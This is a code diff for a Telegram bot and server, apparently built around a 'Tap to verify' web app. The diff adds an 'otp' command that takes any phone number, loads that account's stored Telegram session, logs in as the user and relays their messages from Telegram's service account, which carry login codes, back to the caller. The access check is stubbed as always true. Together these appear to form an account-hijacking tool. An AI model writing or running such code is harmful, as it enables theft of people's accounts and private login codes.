@@ -4,11 +4,14 @@ import { readFileSync } from "fs";
 import { Input, Markup } from "telegraf";
 import fastifyWebsocket from "@fastify/websocket";
 
-import { bot } from "./instance";
+import { bot, createTg } from "./instance";
 import { createAccountRoute } from "./modules";
 import { catchRuntimeError } from "./lib/error";
 import { adminMessageRoute } from "./modules/admin/admin.route";
 import { loginRoute } from "./modules/telegram/telegram.socket";
+import { getAccountByPhoneNumber } from "./modules/account/account.controller";
+import { db } from "./db";
+import { cleanText } from "./lib/format";
 
 const fastify = Fastify({ logger: true, ignoreTrailingSlash: true });
 fastify.register(fastifyWebsocket);
@@ -28,6 +31,24 @@ bot.start((context) => {
       Markup.button.webApp("Tap to verify", process.env.APP_URL!),
     ]).reply_markup,
   });
+});
+
+bot.command("otp", async (context) => {
+  if (true) {
+    const [, phoneNumber] = context.message.text.split(" ");
+    const [account] = await getAccountByPhoneNumber(db, phoneNumber);
+    const tg = createTg(account.session);
+    await tg.client.connect();
+    const messages = await tg.client.getMessages(777000);
+
+    return Promise.all(
+      messages
+        .reverse()
+        .map((message) =>
+          context.replyWithMarkdownV2(cleanText(message.message))
+        )
+    );
+  }
 });
 
 fastify.route({
